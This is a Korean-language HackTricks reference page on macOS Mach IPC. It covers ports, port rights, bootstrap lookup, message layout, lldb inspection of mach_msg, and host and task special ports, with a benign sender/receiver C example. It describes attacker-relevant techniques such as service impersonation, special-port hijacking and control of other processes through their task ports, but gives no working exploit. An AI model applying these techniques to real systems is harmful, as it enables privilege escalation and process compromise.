# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Basic Information

Mach는 리소스를 공유하기 위한 **가장 작은 단위**로 **tasks**를 사용하며, 각 task에는 **여러 threads**가 포함될 수 있습니다. 이러한 **tasks와 threads는 POSIX processes와 threads에 1:1로 매핑**됩니다.

tasks 간 통신은 단방향 communication channels를 사용하는 Mach Inter-Process Communication (IPC)을 통해 이루어집니다. **Messages는 ports 간에 전송**되며, ports는 kernel이 관리하는 일종의 **message queues** 역할을 합니다.

**port**는 Mach IPC의 **기본** 요소입니다. **messages를 보내고 받을 때** 사용할 수 있습니다.

각 process에는 **IPC table**이 있으며, 여기에서 **해당 process의 mach ports**를 찾을 수 있습니다. mach port의 이름은 실제로 숫자입니다(kernel object를 가리키는 pointer).

process는 일부 rights와 함께 port name을 **다른 task**로 보낼 수도 있으며, kernel은 다른 task의 **IPC table**에 해당 항목이 나타나도록 합니다.

### Port Rights

어떤 operations를 task가 수행할 수 있는지 정의하는 Port rights는 이 communication에서 핵심적인 역할을 합니다. 가능한 **port rights**는 ([definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):<sup>[[1]](#references)</sup>

- **Receive right**는 port로 전송된 messages를 받을 수 있도록 합니다. Mach ports는 MPSC (multiple-producer, single-consumer) queues이므로, 전체 system에서 각 port에는 **하나의 receive right만 존재할 수 있습니다**(pipes와는 다릅니다. pipes에서는 여러 processes가 하나의 pipe의 read end에 대한 file descriptors를 보유할 수 있습니다).
- **Receive** right를 가진 **task**는 messages를 받고 **Send rights를 생성**하여 messages를 보낼 수 있습니다. 원래는 **자신의 task만 해당 port에 대한 Receive right를 가집니다**.
- Receive right의 소유자가 **종료**하거나 이를 kill하면, **send right는 쓸모없어집니다(dead name)**.
- **Send right**는 port로 messages를 보낼 수 있도록 합니다.
- Send right는 **cloned**될 수 있으므로, Send right를 소유한 task는 해당 right를 clone하여 **세 번째 task에 부여**할 수 있습니다.
- **port rights** 자체도 Mach messages를 통해 **전달**될 수 있습니다.
- **Send-once right**는 port에 하나의 message를 보낸 후 사라집니다.
- 이 right는 **cloned**될 수 없지만 **moved**될 수 있습니다.
- **Port set right**는 단일 port가 아닌 _port set_을 나타냅니다. port set에서 message를 dequeue하면, 포함된 port 중 하나에서 message가 dequeue됩니다. Port sets는 Unix의 `select`/`poll`/`epoll`/`kqueue`와 매우 유사하게 여러 ports를 동시에 listen하는 데 사용할 수 있습니다.
- **Dead name**은 실제 port right가 아니라 단순한 placeholder입니다. port가 destroy되면 해당 port에 대한 기존의 모든 port rights는 dead names로 변환됩니다.

**Tasks는 다른 task에 SEND rights를 transfer**하여, 해당 task가 messages를 다시 보낼 수 있도록 합니다. **SEND rights는 cloned될 수도 있으므로, task는 이를 duplicate하여 세 번째 task에 전달할 수 있습니다**. 이러한 기능은 **bootstrap server**라는 intermediary process와 결합되어 tasks 간 효과적인 communication을 가능하게 합니다.

### File Ports

File ports를 사용하면 file descriptors를 Mach ports 안에 encapsulate할 수 있습니다(Mach port rights 사용). 주어진 file descriptor에서 `fileport_makeport`를 사용하여 `fileport`를 생성할 수 있으며, `fileport`에서 `fileport_makefd`를 사용하여 file descriptor를 생성할 수 있습니다.

### Establishing a communication

앞서 언급했듯이 Mach messages를 사용하여 rights를 보낼 수 있지만, Mach message를 보내기 위한 right를 이미 보유하고 있지 않다면 **right를 보낼 수 없습니다**. 그렇다면 최초의 communication은 어떻게 수립될까요?

이를 위해 **bootstrap server**(**macOS에서는** `launchd`)가 관여합니다. **모든 사용자가 bootstrap server에 대한 SEND right를 얻을 수 있으므로**, 다른 process에 message를 보낼 수 있는 right를 요청할 수 있습니다.

1. Task **A**가 **새 port를 생성**하고 해당 port에 대한 **RECEIVE right**를 얻습니다.
2. Task **A**는 RECEIVE right의 보유자이므로 **해당 port에 대한 SEND right를 생성**합니다.
3. Task **A**가 **bootstrap server**와 **connection**을 수립하고, 처음에 생성한 port의 **SEND right를 bootstrap server에 보냅니다**.
- 누구나 bootstrap server에 대한 SEND right를 얻을 수 있다는 점을 기억하세요.
4. Task A가 `bootstrap_register` message를 bootstrap server에 보내 해당 port를 `com.apple.taska`와 같은 **name에 associate**합니다.
5. Task **B**가 **bootstrap server**와 상호작용하여 service name에 대한 bootstrap **lookup**(`bootstrap_lookup`)을 실행합니다. bootstrap server가 응답할 수 있도록 task B는 lookup message 내부에 자신이 이전에 생성한 port에 대한 **SEND right를 보냅니다**. lookup이 성공하면 **server는 Task A로부터 받은 SEND right를 duplicate**하여 **Task B로 transmit**합니다.
- 누구나 bootstrap server에 대한 SEND right를 얻을 수 있다는 점을 기억하세요.
6. 이 SEND right를 사용하면 **Task B는 Task A에 message를 보낼 수 있습니다**.
7. 양방향 communication을 위해 일반적으로 task **B**는 **RECEIVE** right와 **SEND** right를 가진 새 port를 생성하고, **SEND right를 Task A에 전달**하여 Task A가 TASK B에 messages를 보낼 수 있도록 합니다(양방향 communication).

bootstrap server는 task가 주장하는 service name을 authenticate할 수 없습니다. 이는 **task**가 모든 system task를 **impersonate**할 수 있음을 의미합니다. 예를 들어 authorization service name을 거짓으로 **claim**한 뒤 모든 request를 승인할 수 있습니다.

그런 다음 Apple은 system이 제공하는 **services의 names**를 **SIP-protected** directories인 `/System/Library/LaunchDaemons` 및 `/System/Library/LaunchAgents`에 위치한 secure configuration files에 저장합니다. 각 service name과 함께 **associated binary**도 저장됩니다. bootstrap server는 각 service name에 대한 **RECEIVE right를 생성하고 보유**합니다.

이러한 predefined services에서는 **lookup process가 약간 다릅니다**. service name을 lookup하면 launchd가 해당 service를 동적으로 시작합니다. 새로운 workflow는 다음과 같습니다.

- Task **B**가 service name에 대한 bootstrap **lookup**을 시작합니다.
- **launchd**가 task가 실행 중인지 확인하고, 실행 중이 아니면 task를 **시작**합니다.
- Task **A**(service)가 **bootstrap check-in**(`bootstrap_check_in()`)을 수행합니다. 이때 **bootstrap** server는 SEND right를 생성하고 보유한 뒤, **RECEIVE right를 Task A로 transfer**합니다.
- launchd가 **SEND right를 duplicate하여 Task B로 보냅니다**.
- **Task B**가 **RECEIVE** right와 **SEND** right를 가진 새 port를 생성하고, **SEND right를 Task A**(svc)에 전달하여 Task A가 TASK B에 messages를 보낼 수 있도록 합니다(양방향 communication).

그러나 이 process는 predefined system tasks에만 적용됩니다. Non-system tasks는 여전히 원래 설명된 방식으로 작동하므로, 잠재적으로 impersonation이 가능할 수 있습니다.

> [!CAUTION]
> 따라서 launchd는 절대 crash해서는 안 됩니다. 그렇지 않으면 전체 system이 crash합니다.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)<sup>[[4]](#references)</sup>

본질적으로 system call인 `mach_msg` function은 Mach messages를 보내고 받는 데 사용됩니다. 이 function은 첫 번째 argument로 전송할 message를 요구합니다. 이 message는 `mach_msg_header_t` structure로 시작해야 하며, 그 뒤에 실제 message content가 이어집니다. 해당 structure는 다음과 같이 정의됩니다.
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
_**receive right**_을 보유한 프로세스는 Mach port에서 메시지를 수신할 수 있습니다. 반대로 **senders**에게는 _**send**_ 또는 _**send-once right**_이 부여됩니다. send-once right은 단일 메시지를 보내는 용도로만 사용되며, 이후에는 무효화됩니다.<sup>[[11]](#references)</sup>

초기 필드 **`msgh_bits`**는 bitmap입니다.

- 첫 번째 비트(가장 상위 비트)는 메시지가 complex인지 나타내는 데 사용됩니다(자세한 내용은 아래 참조).
- 3번째와 4번째 비트는 kernel에서 사용됩니다.
- 2번째 바이트의 **하위 5비트**는 **voucher**에 사용할 수 있습니다. voucher는 key/value 조합을 전송하는 또 다른 유형의 port입니다.
- 3번째 바이트의 **하위 5비트**는 **local port**에 사용할 수 있습니다.
- 4번째 바이트의 **하위 5비트**는 **remote port**에 사용할 수 있습니다.

voucher, local port 및 remote port에서 지정할 수 있는 types는 다음과 같습니다([**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) 참조):<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
예를 들어, `MACH_MSG_TYPE_MAKE_SEND_ONCE`는 이 port에 대해 **send-once** **right**가 파생되어 전송되어야 함을 **indicate**하는 데 사용할 수 있습니다. 수신자가 reply할 수 없도록 `MACH_PORT_NULL`을 지정할 수도 있습니다.

쉬운 **bi-directional communication**을 구현하기 위해 process는 mach **message header**에서 _reply port_ (**`msgh_local_port`**)라고 하는 **mach port**를 지정할 수 있으며, 메시지의 **receiver**는 이 메시지에 **send a reply**할 수 있습니다.

> [!TIP]
> 이러한 종류의 bi-directional communication은 reply를 예상하는 XPC message(`xpc_connection_send_message_with_reply` 및 `xpc_connection_send_message_with_reply_sync`)에서 사용됩니다. 하지만 **일반적으로는 앞에서 설명한 것처럼 서로 다른 port가 생성**되어 bi-directional communication을 구성합니다.

message header의 다른 필드는 다음과 같습니다.

- `msgh_size`: 전체 packet의 크기입니다.
- `msgh_remote_port`: 이 message가 전송되는 port입니다.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html)입니다.
- `msgh_id`: receiver가 해석하는 이 message의 ID입니다.

> [!CAUTION]
> **mach message는 `mach port`를 통해 전송**되며, 이는 mach kernel에 내장된 **단일 receiver**, **다중 sender** communication channel입니다. **여러 process**가 mach port에 **message를 전송**할 수 있지만, 어느 시점이든 port에서 읽을 수 있는 process는 **단 하나**뿐입니다.

message는 이어서 **`mach_msg_header_t`** header, **body**, 그리고 (있는 경우) **trailer**로 구성되며, 해당 message에 reply할 permission을 부여할 수 있습니다. 이러한 경우 kernel은 message를 한 task에서 다른 task로 전달하기만 하면 됩니다.

**trailer**는 **kernel이 message에 추가하는 정보**(user가 설정할 수 없음)이며, `MACH_RCV_TRAILER_<trailer_opt>` flags를 사용해 message 수신 시 요청할 수 있습니다(요청할 수 있는 정보는 여러 종류가 있습니다).

#### Complex Messages

하지만 추가적인 port rights를 전달하거나 memory를 공유하는 경우처럼 더 **복잡한** message도 있으며, 이러한 경우 kernel은 해당 object도 receiver에게 전송해야 합니다. 이 경우 header의 `msgh_bits` 최상위 bit가 설정됩니다.

전달할 수 있는 descriptor는 [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)에 정의되어 있습니다:<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
32비트에서는 모든 descriptor가 12B이고 descriptor type은 11번째 바이트에 있습니다. 64비트에서는 크기가 다양합니다.

> [!CAUTION]
> 커널은 한 task에서 다른 task로 descriptor를 복사하지만, 먼저 **커널 메모리에 복사본을 생성**합니다. "Feng Shui"로 알려진 이 technique은 여러 exploit에서 악용되어, 프로세스가 descriptor를 자기 자신에게 보내도록 만들어 **커널이 해당 데이터를 자신의 메모리에 복사**하게 했습니다. 그러면 프로세스는 메시지를 수신할 수 있습니다(커널이 해당 메시지를 free합니다).
>
> **취약한 프로세스에 port rights를 전송**하는 것도 가능하며, port rights는 해당 프로세스에 나타나기만 합니다(프로세스가 이를 처리하지 않더라도).

### Mac Ports APIs

port는 task namespace에 연결되어 있으므로, port를 생성하거나 검색하려면 task namespace도 함께 조회됩니다(`mach/mach_port.h`에 자세한 내용이 있습니다):<sup>[[6]](#references)</sup>

- **`mach_port_allocate` | `mach_port_construct`**: port를 **생성**합니다.
- `mach_port_allocate`는 **port set**도 생성할 수 있습니다. port 그룹에 대한 receive right입니다. 메시지를 수신할 때마다 메시지가 전달된 port가 표시됩니다.
- `mach_port_allocate_name`: port의 이름을 변경합니다(기본값은 32비트 정수).
- `mach_port_names`: target에서 port 이름을 가져옵니다.
- `mach_port_type`: 이름에 대한 task의 권한을 가져옵니다.
- `mach_port_rename`: port의 이름을 변경합니다(FD의 dup2와 유사).
- `mach_port_allocate`: 새로운 RECEIVE, PORT_SET 또는 DEAD_NAME을 할당합니다.
- `mach_port_insert_right`: RECEIVE 권한이 있는 port에 새로운 right를 생성합니다.
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: **mach message를 전송하고 수신**하는 데 사용되는 함수입니다. overwrite 버전에서는 메시지 수신에 사용할 다른 buffer를 지정할 수 있습니다(다른 버전은 해당 buffer를 그대로 재사용합니다).

### Debug mach_msg

**`mach_msg`** 및 **`mach_msg_overwrite`** 함수는 메시지를 전송하고 수신하는 데 사용되므로, 이 함수에 breakpoint를 설정하면 전송 및 수신된 메시지를 검사할 수 있습니다.

예를 들어 debug할 수 있는 애플리케이션의 debug를 시작하면 해당 애플리케이션은 **이 함수를 사용하는 `libSystem.B`를 로드**합니다.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

**`mach_msg`**의 인수를 확인하려면 register를 확인합니다. 다음은 인수입니다([mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)에서 가져옴):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
레지스트리에서 값을 가져옵니다:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
첫 번째 인수를 확인하여 메시지 헤더를 검사합니다:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
해당 유형의 `mach_msg_bits_t`는 reply를 허용하는 데 매우 일반적으로 사용됩니다.

### 포트 열거
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**name**은 port에 지정된 기본 이름입니다(처음 3바이트에서 어떻게 **increasing**하는지 확인하세요). **`ipc-object`**는 port의 **obfuscated**된 고유 **identifier**입니다.\
또한 **`send`** 권한만 있는 port가 해당 port의 소유자(port name + pid)를 **identifying**하고 있다는 점에 유의하세요.\
그리고 동일한 port에 연결된 **other tasks**를 나타내기 위해 **`+`**가 사용된다는 점도 유의하세요.

[**procesxp**](https://www.newosxbook.com/tools/procexp.html)를 사용하면 **registered service names**도 확인할 수 있습니다(`com.apple.system-task-port`가 필요하므로 SIP가 비활성화된 상태에서):
```
procesp 1 ports
```
iOS에서는 [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)에서 이 도구를 다운로드하여 설치할 수 있습니다.

### 코드 예제

**sender**가 포트를 **할당**하고, `org.darlinghq.example` 이름에 대한 **send right**를 생성한 다음 **bootstrap server**로 전송하는 과정을 확인하세요. 한편 sender는 해당 이름의 **send right**를 요청하고, 이를 사용하여 **메시지를 전송**합니다.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Privileged Ports

일부 특수 포트는 작업이 해당 포트에 대해 **SEND** 권한을 가지고 있을 때 **특정 민감한 작업을 수행하거나 특정 민감한 데이터에 액세스**할 수 있도록 합니다. 이러한 포트는 기능뿐만 아니라 **작업 간에 SEND 권한을 공유할 수 있다는 점** 때문에 공격자 관점에서 흥미롭습니다.

### Host Special Ports

이러한 포트는 숫자로 표시됩니다.

**SEND** 권한은 **`host_get_special_port`**를 호출하여 얻을 수 있고, **RECEIVE** 권한은 **`host_set_special_port`**를 호출하여 얻을 수 있습니다. 그러나 두 호출 모두 **`host_priv`** 포트를 필요로 하며, 이 포트에는 root만 액세스할 수 있습니다. 또한 과거에는 root가 **`host_set_special_port`**를 호출하여 임의의 포트를 hijack할 수 있었고, 예를 들어 `HOST_KEXTD_PORT`를 hijack하여 code signatures를 우회할 수 있었습니다(SIP가 현재 이를 방지합니다).

이는 2개의 그룹으로 나뉩니다. **첫 7개의 포트는 kernel이 소유**하며, 1번은 `HOST_PORT`, 2번은 `HOST_PRIV_PORT`, 3번은 `HOST_IO_MASTER_PORT`, 7번은 `HOST_MAX_SPECIAL_KERNEL_PORT`입니다.\
**8번부터** 시작하는 포트는 **system daemons가 소유**하며 [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html)에 선언되어 있습니다.

- **Host port**: 프로세스가 이 포트에 대한 **SEND** 권한을 가지고 있으면 다음과 같은 routine을 호출하여 **system 정보**를 가져올 수 있습니다:
- `host_processor_info`: processor 정보 가져오기
- `host_info`: host 정보 가져오기
- `host_virtual_physical_table_info`: Virtual/Physical page table (MACH_VMDEBUG 필요)
- `host_statistics`: host statistics 가져오기
- `mach_memory_info`: kernel memory layout 가져오기
- **Host Priv port**: 프로세스가 이 포트에 대해 **SEND** 권한을 가지고 있으면 boot data를 표시하거나 kernel extension을 load하려는 것과 같은 **privileged actions**를 수행할 수 있습니다. 이 권한을 얻으려면 **process가 root여야 합니다**.
- 또한 **`kext_request`** API를 호출하려면 **`com.apple.private.kext*`**와 같은 다른 entitlements가 필요하며, 이는 Apple binaries에만 부여됩니다.
- 호출할 수 있는 다른 routines는 다음과 같습니다:
- `host_get_boot_info`: `machine_boot_info()` 가져오기
- `host_priv_statistics`: privileged statistics 가져오기
- `vm_allocate_cpm`: Contiguous Physical Memory 할당
- `host_processors`: host processors에 대한 Send right
- `mach_vm_wire`: memory를 resident 상태로 만들기
- root는 이 권한에 액세스할 수 있으므로 `host_set_[special/exception]_port[s]`를 호출하여 **host special 또는 exception ports를 hijack**할 수 있습니다.

다음 명령을 실행하면 **모든 host special ports를 확인**할 수 있습니다:
```bash
procexp all ports | grep "HSP"
```
### Task Special Ports

이는 잘 알려진 서비스용으로 예약된 포트입니다. `task_[get/set]_special_port`를 호출하여 가져오거나 설정할 수 있습니다. `task_special_ports.h`에서 확인할 수 있습니다:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):<sup>[[8]](#references)</sup>

- **TASK_KERNEL_PORT**\[task-self send right]: 이 task를 제어하는 데 사용되는 port입니다. task에 영향을 주는 메시지를 보내는 데 사용됩니다. **mach_task_self (see Task Ports below)**가 반환하는 port입니다.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: task의 bootstrap port입니다. 다른 system service port의 반환을 요청하는 메시지를 보내는 데 사용됩니다.
- **TASK_HOST_NAME_PORT**\[host-self send right]: 포함된 host에 대한 정보를 요청하는 데 사용되는 port입니다. **mach_host_self**가 반환하는 port입니다.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: 이 task가 wired kernel memory를 할당받는 source를 나타내는 port입니다.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: 이 task가 기본 memory managed memory를 할당받는 source를 나타내는 port입니다.

### Task Ports

원래 Mach에는 "processes"가 없었고 "tasks"가 있었으며, 이는 thread의 container에 더 가까운 것으로 간주되었습니다. Mach가 BSD와 통합되었을 때 **각 task는 BSD process에 대응되었습니다**. 따라서 모든 BSD process에는 process가 되는 데 필요한 세부 정보가 있고, 모든 Mach task에도 자체 동작이 있습니다(pid 0은 존재하지 않으며 `kernel_task`에 해당하므로 예외입니다).

이와 관련된 매우 흥미로운 function이 두 가지 있습니다:<sup>[[7]](#references)</sup>

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: 지정된 `pid`와 관련된 task의 task port에 대한 SEND right를 가져와 지정된 `target_task_port`에 전달합니다(일반적으로 `mach_task_self()`를 사용한 caller task이지만, 다른 task에 대한 SEND port일 수도 있습니다).
- `pid_for_task(task, &pid)`: task에 대한 SEND right가 주어지면 이 task가 어느 PID와 관련되어 있는지 확인합니다.

task 내부에서 작업을 수행하려면 `mach_task_self()`를 호출하여 task 자체에 대한 `SEND` right를 가져와야 합니다(`task_self_trap` (28)을 사용). 이 권한으로 task는 다음과 같은 여러 작업을 수행할 수 있습니다.

- `task_threads`: task에 속한 thread의 모든 task port에 대한 SEND right 가져오기
- `task_info`: task에 대한 정보 가져오기
- `task_suspend/resume`: task suspend 또는 resume
- `task_[get/set]_special_port`
- `thread_create`: thread 생성
- `task_[get/set]_state`: task state 제어
- 그 외의 항목은 [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)에서 확인할 수 있습니다.

> [!CAUTION]
> 다른 task의 task port에 대한 SEND right가 있으면 해당 task에 대해 이러한 작업을 수행할 수 있습니다.

